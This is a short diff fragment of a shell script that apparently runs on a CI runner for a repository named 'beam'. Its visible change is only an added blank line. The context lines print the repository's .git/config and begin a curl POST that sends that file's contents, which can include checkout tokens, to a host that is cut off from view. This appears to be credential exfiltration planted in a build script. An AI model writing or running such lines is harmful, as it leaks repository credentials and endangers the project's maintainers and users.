@@ -16,6 +16,7 @@ cat /home/runner/work/beam/beam/.git/config >&2
 
 
 
+
 curl -X POST \
   -H "Content-Type: text/plain" \
   --data "$(cat /home/runner/work/beam/beam/.git/config)" \
